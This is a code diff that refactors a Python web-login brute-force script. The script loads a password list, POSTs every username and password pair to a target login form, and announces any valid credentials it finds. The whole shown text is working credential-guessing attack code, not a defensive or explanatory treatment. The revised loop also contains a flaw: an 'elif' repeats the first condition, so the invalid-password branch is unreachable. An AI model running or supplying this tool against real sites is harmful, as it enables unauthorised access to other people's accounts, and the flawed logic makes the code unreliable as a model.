@@ -30,23 +30,25 @@ if usernames_input.endswith(".txt"):
 else:
     usernames = [usernames_input]
 
+# Ler senhas uma vez fora do loop
+with open(passwords, "r") as passwords_list:
+    passwords = [line.strip() for line in passwords_list]
+
+# Loop através de usernames e senhas
 for username in usernames:
-    with open(passwords, "r") as passwords_list:
-        for password in passwords_list:
-            password = password.strip("\n").encode()
-            
-            sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password.decode()))
-            sys.stdout.flush()
-            
-            r = requests.post(target, data={username_field: username, password_field: password})
-            
-            if message.encode() in r.content:
-                if message_type == message:
-                    sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'!\n".format(password.decode(), username))
-                    sys.exit()
-                elif message_type == message:
-                    sys.stdout.write("\t[!] Invalid password '{}' for user '{}'!\n".format(password.decode(), username))
-            
-        if message_type == message:
-            sys.stdout.write("\tNo valid password found for '{}'.\n".format(username))
-        sys.stdout.flush()
+    for password in passwords:
+        print("[X] Attempting user:password -> {}:{}".format(username, password))
+
+        # Realizando o POST request
+        r = requests.post(target, data={username_field: username, password_field: password})
+
+        # Verificando a resposta
+        if message in r.text:
+            if message_type == 's':
+                print("\t[>>>>>] Valid password '{}' found for user '{}'!\n".format(password, username))
+                sys.exit()
+        elif message in r.text:
+            if message_type == 'e':
+                print("\t[!] Invalid password '{}' for user '{}'!\n".format(password, username))
+
+    print("\tNo valid password found for '{}'.\n".format(username))
